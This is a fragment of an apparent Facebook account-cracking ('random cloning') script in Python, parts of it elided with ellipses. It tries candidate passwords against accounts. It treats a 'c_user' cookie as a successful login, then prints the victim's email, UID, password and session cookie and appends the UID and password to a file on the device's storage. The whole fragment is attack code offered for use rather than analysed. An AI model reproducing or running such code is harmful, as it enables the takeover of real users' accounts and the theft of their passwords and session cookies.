...
def xyz():
    ...
    print(f"")
    print(f"[01] {WHITE}RANDOM CLONING")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[AWAIS]---------------------[AW-OK]--------------------[AWAIS]\nEMAIL : '+uid+'\nUID   : '+cid+' AWAIS '+ps+ '\nCOOKIE   : '+coki+'\n[AWAIS]---------------------------------------------------[AWAIS]')
                ...
                open('/sdcard/Awais-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[AWAIS] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
